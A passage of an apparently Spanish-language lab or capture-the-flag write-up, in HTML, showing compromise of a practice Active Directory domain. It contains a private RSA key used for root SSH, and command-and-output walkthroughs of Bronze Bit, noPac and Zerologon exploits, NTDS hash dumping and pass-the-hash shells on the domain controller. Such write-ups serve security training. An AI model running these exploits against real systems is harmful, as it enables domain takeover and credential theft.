+iHGNglz+Wn7ZTVwZxUmKyf5IE9j5JWQyvXqJtEAspq+vQjTCr+WmvgaBma/kKCIl
+ZjzcLtxSMduFZ2G1TW23WoXIE/VzliCxYlvwZM14GWEXiWtHhUmW5C8NacbrDDU5
+G/y/lKaRRuUxScynxXucLePHmfoziVXK4rARTQIDAQABAoIBAQCKzREAHOukNRaH
+9M5HubJC/TSuANgYRt2606MdA8yKa1MeVCgiBUayL7Jkg+0CxzCbrIVj3woxHj8B
+2h6u6OYCcN4k+uD4iXbGhZrrKeQlRDOLsisVH1+u7fgQs/+LDcr+cCHsc6LvntqZ
+bSicvgSCzJLs7TMcRFJ1/BZoVHc+kP+seTf3zG1UFVEFrSzKvam+tNpJqZ3E/uHa
+UJx6l7+AgJGK8sQqVkXgrbIJb70HEmCM34bKMlPLKfD8XArOK4kJ/++LlQM+0ArS
+lFCIgi3bjHzwBTAtp3j9HyvdEWv9g97KhcKYRfR1Oi4GyS+P5STzG8vDaNFNSuPr
+zAP2Pe2BAoGBANrgyidmfp/wfl0Q5nc641MWRRIuQu535viwbBz3K1lkS1OaKE1p
+LD2sCJB6UJMwrlc96ifdjTQiXqu/cFC6gHHxZoA1ubyRq9lxKGYqAVJjqHCkjw3X
+l5AB7GvBlYWPYzudwnAZy5mnb9J7ALzBj6Wgtl/Gi4RFFKs8TZbQk15DAoGBAMC+
+IBvx2FbvgF5hMzusK/SO0eWxh4WeL9rxGV7jAZmRZy9eIc10lp39PjS6k1KgcDnP
+p1oYE/zy075PoaMwtYYwzOv/Oq/Zweofe55XlLBE2AqWy6fOzgvvSpN7W+Z3ekKV
+T0Ff8d5E2pH5Mmm7C6QXHRjwOlZfmXgE+zgRNoEvAoGAUevKnd6VzCUGFq0ppTyM
+Mt/l8D0SXhDQiQn3HQxB1E5ehybuqLKRlW+bMQAmwkB5MDwDNPKOVBH9Hwki74Qu
+aPcyJxB0uShIirT4quxT3FNiiu58gHDN0F937ojg/sFBIeIVEUIGWzc4+i2BhCRq
+MFKrj8NPGq2EY+bJH4ZnceMCgYEApSXDKW6Nqd/JJBUw6t5ZQ1DkdGUq88hYxMZ0
+sKLdihHWUfXcDMjrDTAiDtgWx2OFBWPxxvZ+mewOljBxFPz1bKd/zm6AgJCa4Npc
+942fb3Ftk5UlpwFB92PviHLYiZ6x+T8qC6AEBCkHBrB5C7MjBFRxsB6WPc/oFbhe
+8Ol+xC0CgYEAhFUtb5PyuOqUj/11SouJUmj5VEc3AOiI6tlW2i4HOBJ4xW+8T+iN
+xHaEi7VUv/A/AK5QE0SXn31LvI6XuHW6XaSpf1d2pfBVIS72qcxcY0z/k0dXnzdI  
+C9wR45gixx9rkWkCpXZptDAd+BORFU0xKVXTPWw9iTA9urTdJ1TTE9A=
+-----END RSA PRIVATE KEY-----
+</span><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con la <code class="language-plaintext highlighter-rouge">id_rsa</code> simplemente nos conectamos como <code class="language-plaintext highlighter-rouge">root</code> por ssh y leemos la flag</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">root@10.13.38.18 -i id_rsa
+</span><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
+10.13.38.18 192.168.125.135 172.17.0.1 dead:beef::250:56ff:fe07:4590  
+</span><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p"># cat flag.txt
+RPG{h1j@ckin_lyk_@_pir@t3}
+</span><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra2">
+<br><h3 class="post-title">Extra 2</h3>
+<h4 class="post-title">CVE-2020-17049 - SHINRA Administrator</h4><br>
+
+<p class="plain-text">Antes cuando intentabamos obtener un ticket suplantando a <code class="language-plaintext highlighter-rouge">Administrator</code> nos daba un error y suplantabamos al equipo <code class="language-plaintext highlighter-rouge">SHINRA$</code> sin embargo podemos aprovecharnos del <a href="https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-theory/">bronzebit</a> que podemos explotar solo con <code class="language-plaintext highlighter-rouge">-force-forwardable</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-getST </span><span class="p">-spn cifs/shinra.roundsoft.local roundsoft.local/</span><span class="am">'attackersystem$'</span><span class="p">:123456 -impersonate Administrator  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
+[-] Probably SPN is not allowed to delegate by user attackersystem$ or initial TGT not forwardable
+
+</span><span class="ve">❯ impacket-getST</span><span class="p"> -spn cifs/shinra.roundsoft.local roundsoft.local/</span><span class="am">'attackersystem$'</span><span class="p">:123456 -impersonate Administrator -force-forwardable  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] 	Requesting S4U2self
+[*] 	Forcing the service ticket to be forwardable
+[*] 	Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+
+</span><span class="ve">❯ export </span><span class="p">KRB5CCNAME=Administrator.ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En este punto podemos usar el <code class="language-plaintext highlighter-rouge">ticket</code> para autenticarnos contra la maquina y obtener una shell en <code class="language-plaintext highlighter-rouge">SHINRA</code> que es el DC como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-wmiexec </span><span class="p">shinra.roundsoft.local -k -no-pass -shell-type powershell  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\> </span><span class="am">whoami</span><span class="p">
+roundsoft\administrator
+
+PS C:\> </span><span class="am">hostname</span><span class="p">
+Shinra
+
+PS C:\> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\flag.txt
+RPG{WhY_w0rK_h@rD_Wh3N_U_c@N_d3l3g@7e?}
+
+PS C:\></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">O tambien podriamos dumpear el <code class="language-plaintext highlighter-rouge">ntds</code> para obtener el hash NT de <code class="language-plaintext highlighter-rouge">Administrator</code> y conectarnos al equipo aplicando un <code class="language-plaintext highlighter-rouge">passthehash</code> con cualquier otra herramienta</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb shinra.roundsoft.local -k --use-kcache --ntds drsuapi --user Administrator
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Roundsoft.local\Administrator from ccache </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="am">administrator:500:aad3b435b51404eeaad3b435b51404ee:fe29edb1766170b8afe7a55cbf360885:::</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="extra3">
+<br><h3 class="post-title">Extra 3</h3>
+<h4 class="post-title">CVE-2021-42278 / CVE-2021-42287 - SHINRA Administrator</h4><br>
+
+<p class="plain-text">Como alternativa podemos usar <a href="https://github.com/Ridter/noPac">noPac</a> donde aunque el parametro <code class="language-plaintext highlighter-rouge">-shell</code> no funcionará directamente si que nos creara un ticket como <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">noPac.py roundsoft.local/janderson:Welcome_roundsoft2019! -use-ldap
+
+███    ██  ██████  ██████   █████   ██████ 
+████   ██ ██    ██ ██   ██ ██   ██ ██      
+██ ██  ██ ██    ██ ██████  ███████ ██      
+██  ██ ██ ██    ██ ██      ██   ██ ██      
+██   ████  ██████  ██      ██   ██  ██████ 
+    
+[*] Current ms-DS-MachineAccountQuota = 10
+[-] Resolved Failed: The DNS query name does not exist: Shinra.Roundsoft.local.
+[*] Selected Target shinra.roundsoft.local
+[*] Total Domain Admins 1
+[*] will try to impersonate administrator
+[*] Adding Computer Account "WIN-HUEVONYH9CU$"
+[*] MachineAccount "WIN-HUEVONYH9CU$" password = 7BwjU$Doy$pd
+[*] Successfully added machine account WIN-HUEVONYH9CU$ with password 7BwjU$Doy$pd.
+[*] WIN-HUEVONYH9CU$ object = CN=WIN-HUEVONYH9CU,CN=Computers,DC=Roundsoft,DC=local
+[*] WIN-HUEVONYH9CU$ sAMAccountName == shinra
+[*] Saving a DC's ticket in shinra.ccache
+[*] Reseting the machine account to WIN-HUEVONYH9CU$
+[*] Restored WIN-HUEVONYH9CU$ sAMAccountName to original value
+[*] Using TGT from cache
+[*] Impersonating administrator
+[*] 	Requesting S4U2self
+[*] Saving a user's ticket in administrator.ccache
+[*] Rename ccache to administrator_shinra.roundsoft.local.ccache
+[*] Attempting to del a computer with the name: WIN-HUEVONYH9CU$
+[-] Delete computer WIN-HUEVONYH9CU$ Failed! Maybe the current user does not have permission.  
+
+</span><span class="ve">❯ export </span><span class="p">KRB5CCNAME=administrator_shinra.roundsoft.local.ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En este punto podemos usar el <code class="language-plaintext highlighter-rouge">ticket</code> para autenticarnos contra la maquina y obtener una shell en <code class="language-plaintext highlighter-rouge">SHINRA</code> por lo que nos saltamos todas las demas maquinas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-wmiexec </span><span class="p">shinra.roundsoft.local -k -no-pass -shell-type powershell  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\> </span><span class="am">whoami</span><span class="p">
+roundsoft\administrator
+
+PS C:\> </span><span class="am">hostname</span><span class="p">
+Shinra
+
+PS C:\> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\flag.txt
+RPG{WhY_w0rK_h@rD_Wh3N_U_c@N_d3l3g@7e?}
+
+PS C:\></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">O tambien podriamos dumpear el <code class="language-plaintext highlighter-rouge">ntds</code> para obtener el hash NT de <code class="language-plaintext highlighter-rouge">Administrator</code> y conectarnos al equipo aplicando un <code class="language-plaintext highlighter-rouge">passthehash</code> con cualquier otra herramienta</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb shinra.roundsoft.local -k --use-kcache --ntds drsuapi --user Administrator
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Roundsoft.local\Administrator from ccache </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="am">administrator:500:aad3b435b51404eeaad3b435b51404ee:fe29edb1766170b8afe7a55cbf360885:::</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra4">
+<br><h3 class="post-title">Extra 4</h3>
+<h4 class="post-title">CVE-2020-1472 - SHINRA Administrator</h4><br>
+
+<p class="plain-text">Como alternativa podemos ejecutar la vuln de <a href="https://github.com/dirkjanm/CVE-2020-1472">zerologon</a> hacia SHINRA, el servidor es vulnerable y logramos cambiar la <code class="language-plaintext highlighter-rouge">contraseña</code> del equipo por una cadena vacia</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">cve-2020-1472-exploit.py SHINRA 192.168.125.128
+Performing authentication attempts...
+==========================================================================  
+Target vulnerable, changing account password to empty string
+
+Result: 0
+
+Exploit complete!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Autenticandonos como el equipo <code class="language-plaintext highlighter-rouge">SHINRA$</code> con una cadena vacia como contraseña podemos hacer un <code class="language-plaintext highlighter-rouge">DCSync</code> y ver el hash NT del usuario Administrator</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb shinra.roundsoft.local -u SHINRA$ -p </span><span class="am">''</span><span class="p"> --ntds drsuapi --user Administrator
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Roundsoft.local\SHINRA$: 
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="ro">[-] </span><span class="p">RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="am">administrator:500:aad3b435b51404eeaad3b435b51404ee:fe29edb1766170b8afe7a55cbf360885:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con el hash NT podemos conectarnos haciendo un passthehash con <code class="language-plaintext highlighter-rouge">wmiexec</code> y conseguir una shell como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> directamente en SHINRA</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-wmiexec </span><span class="p">roundsoft.local/Administrator@shinra.roundsoft.local -hashes :fe29edb1766170b8afe7a55cbf360885 -k -shell-type powershell  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\> </span><span class="am">whoami</span><span class="p">
+roundsoft\administrator
+
+PS C:\> </span><span class="am">hostname</span><span class="p">
+Shinra
+
+PS C:\> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\flag.txt
+RPG{WhY_w0rK_h@rD_Wh3N_U_c@N_d3l3g@7e?}
+
+PS C:\></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
